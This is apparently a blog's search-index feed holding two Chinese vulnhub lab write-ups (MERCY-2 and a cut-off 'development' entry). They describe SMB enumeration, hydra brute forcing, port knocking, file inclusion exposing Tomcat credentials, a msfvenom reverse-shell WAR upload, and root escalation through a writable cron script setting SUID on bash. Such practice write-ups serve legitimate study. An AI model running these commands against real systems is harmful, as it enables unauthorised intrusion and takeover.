<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>励志学习第五天之vulnhub-Joy</title>
    <link href="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/"/>
    <url>/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/</url>
    
    <content type="html"><![CDATA[<h1 id="MERCY-2"><a href="#MERCY-2" class="headerlink" title="MERCY-2"></a>MERCY-2</h1><p><strong>靶机IP：192.168.11.149</strong></p><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a><strong>信息收集：</strong></h2><ul><li>先扫一下开放 Tcp 的端口</li></ul><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/1.jpg" class="image.jpg"><br/><br/><br/><br/><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/2.jpg" class="image.jpg"><br/><br/><br/><br/><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/3.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>这里可以很明显的看到开了很多端口，但是22和80端口还是filtered，这里猜测估计要端口敲门</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">端口状态为 `filtered` 表示目标端口可能被防火墙、IDS/IPS或其他网络过滤设备拦截，导致扫描器无法确定端口的真实状态<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>开放了smb服务，继续拿（enum4linux）扫一波</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">enum4linux -a 192.168.11.149<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy    Name: QIU       Desc:<br>index: 0x2 RID: 0x3ea acb: 0x00000010 Account: fluffy   Name:   Desc: <br>index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: qiu      Name:   Desc: <br><br>user:[pleadformercy] rid:[0x3e8]<br>user:[fluffy] rid:[0x3ea]<br>user:[qiu] rid:[0x3e9]<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">扫出来三个用户，先留着吧`pleadformercy` `fluffy` `qiu`</span><br></code></pre></td></tr></table></figure><br/><br/><br/><br/><h2 id="外围打点："><a href="#外围打点：" class="headerlink" title="外围打点："></a><strong>外围打点：</strong></h2><p>还是从网站入手，这里先去看看8080是干嘛的</p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/4.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>是个tomcat的站点，而且底下还泄露了个文件 <code>/etc/tomcat7/tomcat-users.xml</code>，目前不知道咋用，先留着</strong></p><br/><br/><br/><br/><p><strong>点了<code>manager webapp</code> 和 <code>host-manager-webapp</code> 要登录：</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/5.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>还是先放着吧，先去指纹识别和扫一下目录看看</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/6.jpg" class="image.jpg"><br/><br/><br/><br/><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/7.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>扫出来挺多的，依次去访问，访问之后发现有用的就君子协议<code>robots.txt</code>了</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/8.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li><strong>访问 &#x2F;tryharder&#x2F;try&#x2F;har&#x2F;der，看样子是base64编码</strong></li></ul><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/9.jpg" class="image.jpg"><br/><br/><br/><br/><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">base64</span>解密之后：</span><br><br>It&#x27;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.<br><br>Once, we found the password &quot;password&quot;, quite literally sticking on a post-it in front of an employee&#x27;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.<br><br>No fluffy bunnies for those who set insecure passwords and endanger the enterprise.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">翻译：</span><br><br>真是让人无语，但我们还是要反复强调：网络卫生至关重要。请不要再设置那些简单密码了，随便一个密码字典就能轻松破解这些密码。有一次，我们居然发现某位员工在办公桌前的便利贴上明晃晃写着密码&quot;password&quot;！虽然听起来很荒谬，但当我们以解雇相威胁时，这位员工还苦苦求饶。对于那些设置不安全密码、危害企业安全的人，可没有毛茸茸的小兔子哄着——只有严厉处罚等着你们。<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p>主要就是弱密码的问题，这里提示<code>password</code>，就是弱密码了</p><p>这里尝试之前的两个界面去登录测试，发现并不可取，啧，直接进行爆破也是可以，不过暂时继续收集信息</p><br/><br/><br/><br/><p><strong>想到了之前扫的 smb 服务，pop3，都是可以登录的，都去试试看</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/10.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li><strong>pop3不给连接，那就换smb服务</strong></li></ul><br/><br/><br/><br/><p><strong>先进行爆破测试，把之前获取的用户名保存在<code>user</code>文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -L user -P /usr/share/wordlists/fasttrack.txt -e nsr 192.168.11.149 smb<br></code></pre></td></tr></table></figure><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/11.jpg" class="image.jpg"><ul><li><strong>出来一个，qiu用户，还是之前的弱密码</strong></li></ul><br/><br/><br/><br/><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">登录测试</span><br><br>smbclient //192.168.11.149/qiu -U qiu<br></code></pre></td></tr></table></figure><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/12.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>为了方便查看，我们都下载到kali去看</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">为了放到一个文件夹我先在kali桌面创建一个tmp文件夹</span><br>mkdir tmp<br><span class="hljs-meta prompt_">#</span><span class="language-bash">关闭交互，这样下载时，默认选择<span class="hljs-built_in">yes</span></span><br>prompt<br><span class="hljs-meta prompt_">#</span><span class="language-bash">开启递归，把文件夹中的文件也会下载</span><br>recurse<br><span class="hljs-meta prompt_">#</span><span class="language-bash">更改默认路径到/root/桌面/tmp，因为是在桌面连接的，默认在桌面</span><br>lcd /root/桌面/tmp<br><span class="hljs-meta prompt_">#</span><span class="language-bash">下载所有内容</span><br>mget *<br></code></pre></td></tr></table></figure><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/13.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>接下来就是依依查看，里面文件了，下面就以找到的重要文件</strong></p><br/><br/><br/><br/><ul><li><strong>在&#x2F;.private&#x2F;opensesame目录下，查看config配置文件，找到了端口敲门的序列，那就好办了</strong></li></ul><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/14.jpg" class="image.jpg"><br/><br/><br/><br/><h2 id="端口敲门："><a href="#端口敲门：" class="headerlink" title="端口敲门："></a><strong>端口敲门：</strong></h2><p><strong>管它三七二十一，先把22端口和80端口开了先</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">这里使用nc开放</span><br>nc -z 192.168.11.149 159 27391 4 （开放http 80端口）<br>nc -z 192.168.11.149 17301 28504 9999 （开放ssh 22端口）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">当然这里也可以用knock 例如：</span><br>knock 192.168.10.11 17301 28504 9999<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/15.jpg" class="image.jpg"><ul><li><strong>这下全开放了</strong></li></ul><br/><br/><br/><br/><p><strong>不是有个qiu的用户吗？那肯定得先去试试ssh啊</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/16.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>不给连，那只能又从网站入手了，访问80端口看看</strong></p><br/><br/><br/><br/><p><strong>这里不知道为什么物理机打不开了，只好从kali上访问看看了，进去之后是被嘲讽一波，没有有用信息</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/17.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>继续扫目录，仍然是有个君子协议 robots.txt ，去看看</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/18.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>发现两个路径<code>/mercy、nomercy</code>，访问<code>mercy</code>，发现是一段话，并且可能无用</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/19.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>访问<code>nomercy</code>，这可能是一个<code>cms</code>，并且在测试时，点击按钮无反应，并且界面中显示出了可能是<code>cms</code>的名称和版本信息</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/20.jpg" class="image.jpg"><br/><br/><br/><br/><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a><strong>漏洞利用：</strong></h2><p>使用<code>searchsploit</code>搜索有无漏洞可利用，发现是有一个</p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/21.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>查看这个文档，两个可能，不过看来都像是文件包含</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/22.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>一开始是想试试远程文件包含，不过没有成功，不知道是什么原因，</strong></p><p><strong>虽然远程文件是包含了，但是作为<code>php</code>相当于没有被解析，那就按txt文档来看看吧</strong></p><br/><br/><br/><br/><p><strong>一个个的测试</strong>*</p><ul><li><code>/windows/code.php</code></li></ul><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/23.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li><code>/windows/function.php</code>（这个也行，不过只有一行，也不知道为啥）</li></ul><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/24.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>之前在8080端口的默认网站的最下面，提示到了这个用户方面的配置文件的位置<code>/etc/tomcat7/tomcat-users.xml</code></strong></p><p><strong>直接包含这个文件进行查看，获取两组，不过从配置来看<code>thisisasuperduperlonguser</code>权限更大</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/25.jpg" class="image.jpg"><br/><br/><br/><br/><table><thead><tr><th align="center">用户名</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">thisisasuperduperlonguser</td><td align="center">heartbreakisinevitable</td></tr><tr><td align="center">fluffy</td><td align="center">freakishfluffybunny</td></tr></tbody></table><br/><br/><br/><br/><ul><li><strong>去登录tomcat看看</strong></li></ul><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/26.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>发现上传点</strong></p><p><strong>这里有两个方法：</strong></p><ul><li><p>直接从msf搜漏洞打</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">search tomcat upload<br></code></pre></td></tr></table></figure></li><li><p>还是利用msf的模块生成木马反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.16 LPORT=8888 -f war -o shell.war<br></code></pre></td></tr></table></figure></li></ul><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/27.jpg" class="image.jpg"><ul><li><strong>成功拿到shell</strong></li></ul><br/><br/><br/><br/><h2 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a><strong>后渗透：</strong></h2><p><strong>在这里折腾了一会，就没截图，直接切换<code>fluffy</code>用户，所用的密码就是在<code>tomcat</code>的配置文件中发现的两组用户，</strong></p><p><strong>为什么能切换，首先就是确认了系统中有这个用户，然后就是测试是否存在一个密码多用的情况</strong></p><br/><br/><br/><br/><p><strong>在<code>fluffy</code>的家目录下的一个文件夹中，发现一个疑似定时任务的脚本，所属者为<code>root</code>，并且这个文件别人是可以修改的</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/28.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>管它三七二十一，反正是777的权限，就先添加一句，因为目前不确定</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;chmod +s /bin/bash&quot; &gt;&gt; timeclock<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><h2 id="提权："><a href="#提权：" class="headerlink" title="提权："></a><strong>提权：</strong></h2><p><strong>进行一系列的常规的信息收集之后，发现 &#x2F;bin&#x2F;bash 被加入suid权限位了，那就是计划任务搞的了</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/29.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>执行语句进行提权</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/bash -p<br></code></pre></td></tr></table></figure><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/30.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>至此就通关了</strong></p><img src="/2025/06/01/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9%E4%B9%8Bvulnhub-Joy/31.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>总结：</strong></p><ul><li>一个常见的robots.txt泄露敏感目录</li><li>常见的编码，这里是base64</li><li>smb服务的连接，以及文件的下载</li><li>端口敲门服务，需要特定的序列顺序</li><li>识别cms并得知其漏洞，这里就是文件包含漏洞，但是配合tomcat的用户配置文件的位置泄露，导致获取到关键信息</li><li>对于tomcat的war文件部署，通过msfvenom生成脚本文件，并获取反弹shell</li><li>水平提权时，用户可能存在一码多用的情况</li><li>提权至root时，收集到一个疑似定时任务的脚本，尝试写入语句，最终成功执行了。</li></ul><hr>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>励志学习第四天之vulnhub-development</title>
    <link href="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/"/>
    <url>/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/</url>
    
    <content type="html"><![CDATA[<h1 id="development"><a href="#development" class="headerlink" title="development"></a>development</h1><p><strong>靶机IP：192.168.11.148</strong></p><br/><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a><strong>信息收集：</strong></h2><br/><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">快速扫描一下扫描tcp端口</span><br>nmap -sT 192.168.11.148 --min-rate=1000  -p- -T4 <br></code></pre></td></tr></table></figure><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/1.jpg" class="image.jpg"><br/><br/><br/><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">对开发的tcp端口详细扫描</span><br><br>nmap -A 192.168.11.148 -p 22,113,139,445,8080<br><br>nmap -sV -O -sC -sT 192.168.11.148 -p 22,113,139,445,8080<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">（-A 并配合root权限，能实现更高效的扫描（SYN扫描）和更全面的信息收集（如路由路径）</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">（若目标网络存在严格过滤，-A 默认的SYN扫描比 -sT 更容易绕过基础防护）</span><br></code></pre></td></tr></table></figure><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/2.jpg" class="image.jpg"><br/><br/><br/><br/><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/3.jpg" class="image.jpg"><br/><br/><br/><br/><h2 id="外围打点："><a href="#外围打点：" class="headerlink" title="外围打点："></a><strong>外围打点：</strong></h2><p>开放了smb服务，直接怼（enum4linux）扫一波</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">基本用法</span><br>enum4linux -a 目标IP （全面扫描，推荐使用）<br>enum4linux -U 目标IP（提取用户名如administrator、guest等）<br>enum4linux -S 目标IP（显示print$、ADMIN$等默认共享及自定义共享）<br>enum4linux -P 目标IP（获取最小密码长度、过期时间等）<br>enum4linux -o 目标IP（识别系统版本，如Samba 3.x或Windows Server版本）<br></code></pre></td></tr></table></figure><br/><br/><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">1. 基础信息</span><br>目标IP: 192.168.11.148<br>主机名: DEVELOPMENT<br>工作组: WORKGROUP（非域环境，可能为对等网络）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">2. 服务与系统信息</span><br>Samba版本: Ubuntu上的Samba服务器（具体版本未明确，但OS版本标记为6.1）。<br>开放服务:<br>文件共享服务（File Server Service）<br>打印机驱动共享（print$）<br>自定义共享目录（access，权限拒绝访问）<br>IPC管道（IPC$）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">3. 用户与权限</span><br>发现用户:<br>intern (RID: 1000，账户状态正常)<br>匿名访问:<br>允许空用户名/空密码会话（可能存在安全风险）。<br>共享权限:<br><span class="hljs-meta prompt_">print$ </span><span class="language-bash">和 access 共享目录均拒绝匿名访问（Mapping: DENIED）。</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">4. 密码策略</span><br>最小密码长度: 5字符<br>密码复杂度: 禁用<br>密码历史: 无限制<br>账户锁定策略: 无锁定阈值（可无限次尝试登录）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">5. 潜在攻击面</span><br>弱密码风险: 用户 intern 可能使用简单密码（因密码复杂度禁用）。<br>共享目录利用: 若获取有效凭据，可访问 access 共享。<br>Samba漏洞: 需进一步确认Ubuntu/Samba版本以查找已知漏洞（如CVE-2017-7494等）。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">6. 后续渗透建议</span><br>暴力破解:<br>针对用户 intern 使用工具（如 hydra）爆破SMB服务。<br>密码字典需包含长度≥5的弱密码（如 intern123, password）。<br>Samba版本探测:<br>使用 smbclient -L //192.168.11.148 或 nmap --script smb-vuln* 检测漏洞。<br>共享目录深入:<br>若获取凭据，尝试访问 access 共享：<br>smbclient //192.168.11.148/access -U intern<br>匿名IPC探查:<br>通过 rpcclient -U &quot;&quot; -N 192.168.11.148 尝试枚举更多信息。<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>访问8080端口看看：</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/4.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>扫目录：</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/5.jpg" class="image.jpg"><ul><li>（芜湖，好像会封我）</li></ul><br/><br/><br/><br/><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">（减小线程，加延迟，随机ua头和本机扫描看看）</span><br>python dirsearch.py -u http://192.168.11.148:8080 -t 10 --delay=500 -H &quot;X-Forwarded-For:127.0.0.1&quot; --random-agent <br></code></pre></td></tr></table></figure><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/6.jpg" class="image.jpg"><ul><li>还是不行，有点意思</li></ul><br/><br/><br/><br/><p><strong>回到首页仔细看看有什么吧</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/7.jpg" class="image.jpg"><ul><li>说了有很多文件，那就去看看吧</li></ul><br/><br/><br/><br/><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/8.jpg" class="image.jpg"><p><strong>还真挺多目录的，一个一个看看吧</strong></p><br/><br/><br/><br/><p><strong>访问后，以几个重点截图，注意，要查看页面源代码才能发现的</strong></p><br/><br/><br/><p><br/>pment.html访问给出一个目录&#96;.&#x2F;developmentsecretpage**</p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/9.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>在downloads.html目录给出一个文件<code>test.pacp</code>，格式来看像是数据流量包</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/10.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>访问<code>./developmentsecretpage</code></strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/11.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>给出一个<code>patrick.php</code>文件，点击访问，确实可解析<code>php</code>文件，并且有一个<code>sitemap.php</code>文件及链接</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/12.jpg" 